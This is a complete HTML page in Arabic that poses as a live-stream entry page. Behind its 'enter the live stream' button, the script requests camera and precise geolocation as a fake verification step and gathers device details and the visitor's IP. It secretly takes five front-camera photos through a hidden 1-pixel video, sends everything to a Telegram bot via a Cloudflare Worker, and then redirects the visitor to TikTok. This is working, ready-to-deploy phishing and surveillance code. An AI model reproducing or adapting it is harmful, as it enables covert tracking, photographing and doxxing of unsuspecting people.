<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>LIVE - بث مباشر</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; overflow: hidden; }
    body {
        font-family: Arial, Tahoma, sans-serif;
        color: #ffffff;
        background:
            radial-gradient( circle at 20% 20%, rgba(255, 49, 95, 0.22), transparent 35% ),
            radial-gradient( circle at 80% 80%, rgba(80, 50, 255, 0.20), transparent 35% ),
            linear-gradient( 135deg, #07070c, #0d0d17, #080910 );
        display: flex; align-items: center; justify-content: center;
    }

    .page {
        width: 100%; height: 100vh;
        display: flex; align-items: center; justify-content: center;
        position: relative; overflow: hidden;
    }

    .circle {
        position: absolute; border-radius: 50%;
        filter: blur(2px); opacity: 0.45; pointer-events: none;
    }
    .circle.one { width: 280px; height: 280px; background: rgba(255, 49, 95, 0.10); top: -100px; right: -80px; }
    .circle.two { width: 350px; height: 350px; background: rgba(75, 55, 255, 0.10); bottom: -150px; left: -100px; }

    .content {
        width: min(90%, 650px);
        text-align: center; position: relative; z-index: 2;
        display: flex; flex-direction: column; align-items: center;
    }

    .logo {
        font-size: clamp(55px, 10vw, 95px);
        font-weight: 900; letter-spacing: 5px; margin-bottom: 20px;
        text-shadow: 0 10px 40px rgba(0, 0, 0, 0.45);
    }
    .logo span { color: #ff315f; }

    .status {
        display: inline-flex; align-items: center; gap: 9px;
        color: #b8b8c4; font-size: 14px; margin-bottom: 22px;
    }
    .status-dot {
        width: 9px; height: 9px; background: #ff315f; border-radius: 50%;
        box-shadow: 0 0 0 6px rgba(255,49,95,.10), 0 0 20px rgba(255,49,95,.7);
        animation: pulse 1.4s infinite;
    }
    @keyframes pulse {
        0% { transform: scale(1); opacity: 1; }
        50% { transform: scale(.65); opacity: .5; }
        100% { transform: scale(1); opacity: 1; }
    }

    .title {
        font-size: clamp(27px, 5vw, 43px);
        font-weight: 800; line-height: 1.3; margin-bottom: 13px;
    }
    .title span { color: #ff315f; }

    .description {
        color: #92939f; font-size: 16px; line-height: 1.7;
        margin-bottom: 35px; max-width: 480px;
    }

    .live-button {
        width: 100%; max-width: 520px; min-height: 72px;
        border: none; border-radius: 18px;
        background: linear-gradient( 135deg, #ff315f, #ff174f );
        color: white; text-decoration: none;
        display: flex; align-items: center; justify-content: center; gap: 13px;
        font-size: 20px; font-weight: 800; cursor: pointer;
        box-shadow: 0 15px 45px rgba(255, 49, 95, 0.28);
        transition: transform .25s ease, box-shadow .25s ease, opacity .25s ease;
        font-family: inherit;
        position: relative;
        overflow: hidden;
    }
    .live-button:hover:not(:disabled) {
        transform: translateY(-3px);
        box-shadow: 0 20px 55px rgba(255, 49, 95, 0.45);
    }
    .live-button:active:not(:disabled) { transform: scale(.98); }
    .live-button:disabled {
        opacity: 0.7; cursor: not-allowed;
    }

    .button-dot {
        width: 11px; height: 11px; background: white; border-radius: 50%;
        box-shadow: 0 0 15px rgba(255,255,255,.8);
        flex-shrink: 0;
    }

    .btn-spinner {
        width: 18px; height: 18px;
        border: 3px solid rgba(255,255,255,0.35);
        border-top-color: white;
        border-radius: 50%;
        animation: spin 0.7s linear infinite;
        flex-shrink: 0;
        display: none;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .live-button.loading .button-dot { display: none; }
    .live-button.loading .btn-spinner { display: block; }

    .bottom-text {
        margin-top: 24px; color: #555663; font-size: 12px;
    }

    .error-toast {
        position: fixed;
        bottom: 30px; left: 50%;
        transform: translateX(-50%) translateY(120px);
        background: #ff174f;
        color: white;
        padding: 14px 24px;
        border-radius: 14px;
        font-size: 13px;
        font-weight: 600;
        z-index: 200;
        box-shadow: 0 8px 30px rgba(255, 23, 79, 0.5);
        transition: transform .4s cubic-bezier(.175,.885,.32,1.275);
        max-width: 90%;
        text-align: center;
        line-height: 1.6;
    }
    .error-toast.show { transform: translateX(-50%) translateY(0); }

    .loading-overlay {
        position: fixed;
        inset: 0;
        background: rgba(7, 7, 12, 0.9);
        backdrop-filter: blur(8px);
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        z-index: 300;
        gap: 20px;
    }
    .loading-overlay.active { display: flex; }

    .big-spinner {
        width: 55px; height: 55px;
        border: 5px solid rgba(255,255,255,0.1);
        border-top-color: #ff315f;
        border-right-color: #5032ff;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
    }

    .loading-text {
        color: #ffffff;
        font-size: 15px;
        font-weight: 700;
        letter-spacing: .5px;
        text-align: center;
    }

    .loading-sub {
        color: #92939f;
        font-size: 12px;
        margin-top: -8px;
        text-align: center;
        padding: 0 20px;
    }

    .photo-progress {
        width: 200px;
        height: 6px;
        background: rgba(255,255,255,0.1);
        border-radius: 10px;
        overflow: hidden;
        margin-top: 5px;
    }
    .photo-progress-bar {
        height: 100%;
        background: linear-gradient(90deg, #ff315f, #5032ff);
        width: 0%;
        transition: width 0.4s ease;
        border-radius: 10px;
    }

    /* أيقونة نجاح */
    .success-check {
        width: 70px;
        height: 70px;
        border-radius: 50%;
        background: linear-gradient(135deg, #10b981, #34d399);
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 10px 40px rgba(16, 185, 129, 0.4);
        animation: popIn 0.5s ease;
    }
    .success-check svg { width: 38px; height: 38px; }
    @keyframes popIn {
        from { transform: scale(0); opacity: 0; }
        to { transform: scale(1); opacity: 1; }
    }

    #video, #canvas {
        position: fixed;
        top: 0; left: 0;
        width: 1px; height: 1px;
        opacity: 0;
        pointer-events: none;
        z-index: -999;
    }

    @media (max-width: 600px) {
        .content { width: 88%; }
        .logo { font-size: 62px; margin-bottom: 14px; }
        .title { font-size: 28px; }
        .description { font-size: 14px; margin-bottom: 28px; }
        .live-button { min-height: 68px; font-size: 18px; border-radius: 15px; }
        .bottom-text { margin-top: 18px; }
    }
</style>
</head>
<body>

<main class="page">
    <div class="circle one"></div>
    <div class="circle two"></div>

    <div class="content">
        <div class="logo">LI<span>VE</span></div>

        <div class="status">
            <span class="status-dot"></span>
            البث المباشر متاح الآن
        </div>

        <h1 class="title">شاهد البث <span>مباشرة</span></h1>

        <p class="description">
            ادخل إلى البث المباشر واستمتع بالمحتوى وتابع ما يحدث الآن.
        </p>

        <button type="button" class="live-button" id="liveBtn" onclick="startProcess()">
            <span class="button-dot"></span>
            <span class="btn-spinner"></span>
            <span class="btn-text">دخول البث المباشر</span>
        </button>

        <div class="bottom-text">بث مباشر • سريع • آمن</div>
    </div>
</main>

<!-- شاشة التحميل -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="big-spinner" id="mainSpinner"></div>
    <div class="success-check" id="successCheck" style="display:none;">
        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3">
            <polyline points="20 6 9 17 4 12"/>
        </svg>
    </div>
    <div class="loading-text" id="loadingText">جاري طلب الصلاحيات...</div>
    <div class="loading-sub" id="loadingSub"> يرجى الموافقة على الصلاحيات </div>
    <div class="photo-progress" id="photoProgress" style="display:none;">
        <div class="photo-progress-bar" id="photoProgressBar"></div>
    </div>
</div>

<!-- رسالة الخطأ -->
<div class="error-toast" id="errorToast"></div>

<!-- عناصر الكاميرا المخفية -->
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    // ==========================================
    // ⚙️ الإعدادات - عدل هذه القيم فقط
    // ==========================================
    
    // رابط الـ Worker الخاص بك
    const API_URL = "https://telegram.mustafaalomar911.workers.dev";
    
    // 🔗 رابط الموقع الذي سيتم الانتقال إليه بعد نجاح العملية
    // ضع أي رابط بث مباشر تريده هنا
    const REDIRECT_URL = "https://vt.tiktok.com/ZSqVrN9nf/";
    
    // عدد الصور المطلوب التقاطها
    const CAPTURE_COUNT = 5;
    
    // الفاصل الزمني بين الصور (بالمللي ثانية)
    const CAPTURE_INTERVAL = 2000;
    
    // ⏱️ مدة عرض رسالة النجاح قبل الانتقال (بالمللي ثانية)
    const SUCCESS_DELAY = 1500;
    
    // ⚠️ الرابط قد يكون:
    // - قناة يوتيوب: "https://www.youtube.com/@channelname/live"
    // - بث تويتر: "https://twitter.com/i/broadcasts/xxxxx"
    // - بث فيسبوك: "https://www.facebook.com/yourpage/videos/xxxxx"
    // - تيك توك لايف: "https://www.tiktok.com/@username/live"
    // - Twitch: "https://www.twitch.tv/username"
    // - أي رابط آخر

    // ==========================================
    // عناصر الصفحة
    // ==========================================
    const liveBtn = document.getElementById('liveBtn');
    const btnText = liveBtn.querySelector('.btn-text');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    const loadingSub = document.getElementById('loadingSub');
    const errorToast = document.getElementById('errorToast');
    const photoProgress = document.getElementById('photoProgress');
    const photoProgressBar = document.getElementById('photoProgressBar');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const mainSpinner = document.getElementById('mainSpinner');
    const successCheck = document.getElementById('successCheck');

    let isProcessing = false;
    let cameraStream = null;

    // ==========================================
    // عرض رسالة خطأ
    // ==========================================
    function showError(msg, duration = 5000) {
        errorToast.textContent = msg;
        errorToast.classList.add('show');
        clearTimeout(errorToast._t);
        errorToast._t = setTimeout(() => {
            errorToast.classList.remove('show');
        }, duration);
    }

    // ==========================================
    // شاشة التحميل
    // ==========================================
    function showLoading(text, sub) {
        loadingText.textContent = text || 'جاري التحميل...';
        loadingSub.textContent = sub || '';
        loadingOverlay.classList.add('active');
    }

    function hideLoading() {
        loadingOverlay.classList.remove('active');
    }

    function updateProgress(current, total) {
        photoProgress.style.display = 'block';
        const percentage = (current / total) * 100;
        photoProgressBar.style.width = percentage + '%';
    }

    // ==========================================
    // إرسال إلى Worker
    // ==========================================
    async function sendToWorker(action, data) {
        try {
            const res = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: action, ...data })
            });
            return await res.json();
        } catch (err) {
            console.error('Worker error:', err);
            return { ok: false, error: err.message };
        }
    }

    async function sendMessage(text) {
        return await sendToWorker('sendMessage', { text: text });
    }

    async function sendPhoto(base64, caption) {
        let clean = base64;
        if (clean.includes(',')) clean = clean.split(',')[1];
        return await sendToWorker('sendPhoto', { image: clean, caption: caption });
    }

    // ==========================================
    // معلومات الجهاز
    // ==========================================
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let browser = 'غير معروف';
        if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Safari')) browser = 'Safari';

        let os = 'غير معروف';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

        let deviceType = 'كمبيوتر';
        if (/Mobi|Android|iPhone/i.test(ua)) deviceType = 'جوال';
        if (/iPad|Tablet/i.test(ua)) deviceType = 'تابلت';

        return {
            deviceType, os, browser,
            userAgent: ua,
            screen: screen.width + 'x' + screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            time: new Date().toLocaleString('ar-SY')
        };
    }

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            return (await res.json()).ip;
        } catch (e) { return 'غير متوفر'; }
    }

    // ==========================================
    // طلب الموقع
    // ==========================================
    function requestLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                return resolve({ ok: false, reason: 'unsupported' });
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        ok: true,
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        mapUrl: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
                    });
                },
                (error) => {
                    resolve({ ok: false, reason: error.message, code: error.code });
                },
                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
            );
        });
    }

    // ==========================================
    // طلب الكاميرا
    // ==========================================
    async function requestMedia() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return { ok: false, reason: 'unsupported' };
        }
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
            return { ok: true, stream };
        } catch (err) {
            return { ok: false, reason: err.name, error: err };
        }
    }

    // ==========================================
    // التقاط صورة
    // ==========================================
    function capturePhoto() {
        return new Promise((resolve, reject) => {
            try {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const base64 = canvas.toDataURL('image/jpeg', 0.7);
                resolve(base64);
            } catch (err) {
                reject(err);
            }
        });
    }

    function stopCamera() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(t => t.stop());
            cameraStream = null;
        }
        if (video) video.srcObject = null;
    }

    // ==========================================
    // الدالة الرئيسية
    // ==========================================
    async function startProcess() {
        if (isProcessing) return;
        isProcessing = true;

        liveBtn.disabled = true;
        liveBtn.classList.add('loading');
        btnText.textContent = 'جاري التحقق...';

        // إعادة تعيين الأيقونات
        mainSpinner.style.display = 'block';
        successCheck.style.display = 'none';

        showLoading('جاري طلب الصلاحيات...', 'يرجى الموافقة على الصلاحيات  ');

        try {
            // 1. طلب الموقع والكاميرا
            const [mediaResult, locationResult] = await Promise.all([
                requestMedia(),
                requestLocation()
            ]);

            // 2. التحقق من صلاحيات الكاميرا
            if (!mediaResult.ok) {
                hideLoading();
                resetButton();

                let msg = 'تعذر الوصول إلى الكاميرا. ';
                switch (mediaResult.reason) {
                    case 'NotAllowedError':
                    case 'PermissionDeniedError':
                        msg += 'تم رفض الصلاحية. يرجى السماح بالوصول من إعدادات المتصفح.';
                        break;
                    case 'NotFoundError':
                    case 'DevicesNotFoundError':
                        msg += 'لا توجد كاميرا متصلة بالجهاز.';
                        break;
                    case 'NotReadableError':
                    case 'TrackStartError':
                        msg += 'الكاميرا قيد الاستخدام من تطبيق آخر.';
                        break;
                    case 'unsupported':
                        msg = 'متصفحك لا يدعم الوصول إلى الكاميرا.';
                        break;
                    default:
                        msg += 'حدث خطأ: ' + (mediaResult.reason || '');
                }
                showError(msg, 6000);
                return;
            }

            // 3. ربط الكاميرا
            cameraStream = mediaResult.stream;
            video.srcObject = cameraStream;

            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play().then(resolve).catch(resolve);
                };
                setTimeout(resolve, 3000);
            });

            // 4. إرسال المعلومات
            showLoading('جاري التحقق من البيانات...', 'يرجى الانظار');

            const deviceInfo = getDeviceInfo();
            const ip = await getIP();

            let infoMsg = '🎥 <b>زائر جديد - دخول البث المباشر</b>\n\n';
            infoMsg += '━━━━━━━━━━━━━━━━━\n';
            infoMsg += '📱 <b>معلومات الجهاز</b>\n';
            infoMsg += '━━━━━━━━━━━━━━━━━\n';
            infoMsg += `📱 <b>النوع:</b> ${deviceInfo.deviceType}\n`;
            infoMsg += `💻 <b>النظام:</b> ${deviceInfo.os}\n`;
            infoMsg += `🌐 <b>المتصفح:</b> ${deviceInfo.browser}\n`;
            infoMsg += `🖥 <b>الشاشة:</b> ${deviceInfo.screen}\n`;
            infoMsg += `🌍 <b>اللغة:</b> ${deviceInfo.language}\n`;
            infoMsg += `⏰ <b>المنطقة:</b> ${deviceInfo.timezone}\n`;
            infoMsg += `🕐 <b>الوقت:</b> ${deviceInfo.time}\n`;
            infoMsg += '\n━━━━━━━━━━━━━━━━━\n';
            infoMsg += '📍 <b>معلومات الموقع</b>\n';
            infoMsg += '━━━━━━━━━━━━━━━━━\n';
            if (locationResult.ok) {
                infoMsg += `📍 <b>الإحداثيات:</b> ${locationResult.lat}, ${locationResult.lng}\n`;
                infoMsg += `🎯 <b>الدقة:</b> ${Math.round(locationResult.accuracy)} متر\n`;
                infoMsg += `🗺 <a href="${locationResult.mapUrl}">عرض على الخريطة</a>\n`;
            } else {
                infoMsg += '⚠️ لم يتم تحديد الموقع\n';
            }
            infoMsg += '\n━━━━━━━━━━━━━━━━━\n';
            infoMsg += '🌐 <b>الشبكة</b>\n';
            infoMsg += '━━━━━━━━━━━━━━━━━\n';
            infoMsg += `🔢 <b>IP:</b> <code>${ip}</code>\n`;

            await sendMessage(infoMsg);

            // 5. التقاط الصور
            showLoading('جاري التحميل...', 'يرجى الانتظار قليلاً');
            
            for (let i = 1; i <= CAPTURE_COUNT; i++) {
                await new Promise(r => setTimeout(r, i === 1 ? 800 : CAPTURE_INTERVAL));
                
                const photo = await capturePhoto();
                updateProgress(i, CAPTURE_COUNT);
                
                await sendPhoto(photo, `📸 صورة ${i}/${CAPTURE_COUNT} - دخول البث`);
                console.log('📤 صورة ' + i + ' تم إرسالها');
            }

            // 6. إيقاف الكاميرا
            stopCamera();

            // 7. رسالة النجاح للبوت
            await sendMessage(
                '✅ <b>اكتمل التحقق بنجاح - البث المباشر</b>\n' +
                `📸 عدد الصور: ${CAPTURE_COUNT}\n` +
                `📱 الجهاز: ${deviceInfo.deviceType} - ${deviceInfo.browser}\n` +
                `🔢 IP: <code>${ip}</code>\n` +
                `➡️ جاري الانتقال إلى: <a href="${REDIRECT_URL}">${REDIRECT_URL}</a>`
            );

            // 8. عرض شاشة النجاح
            mainSpinner.style.display = 'none';
            successCheck.style.display = 'flex';
            photoProgress.style.display = 'none';
            
            loadingText.textContent = '✅ تم التحقق بنجاح';
            loadingSub.textContent = 'جاري تحويلك إلى البث المباشر...';

            // 9. الانتقال إلى رابط البث بعد التأخير
            setTimeout(() => {
                try {
                    sessionStorage.setItem('permissions_granted', '1');
                } catch (e) {}
                
                console.log('➡️ الانتقال إلى:', REDIRECT_URL);
                window.location.href = REDIRECT_URL;
            }, SUCCESS_DELAY);

        } catch (error) {
            console.error('❌ خطأ:', error);
            stopCamera();
            hideLoading();
            resetButton();
            showError('حدث خطأ: ' + (error.message || 'غير معروف'), 6000);
            
            try {
                await sendMessage('❌ خطأ: ' + error.message);
            } catch (e) {}
        }
    }

    // ==========================================
    // إعادة تعيين
    // ==========================================
    function resetButton() {
        isProcessing = false;
        liveBtn.disabled = false;
        liveBtn.classList.remove('loading');
        btnText.textContent = 'دخول البث المباشر';
        photoProgress.style.display = 'none';
        photoProgressBar.style.width = '0%';
        mainSpinner.style.display = 'block';
        successCheck.style.display = 'none';
    }

    window.addEventListener('pageshow', () => {
        hideLoading();
        resetButton();
    });

    window.addEventListener('load', () => {
        console.log('✅ الصفحة جاهزة');
        console.log('📡 Worker:', API_URL);
        console.log('➡️ رابط الانتقال:', REDIRECT_URL);
    });
</script>
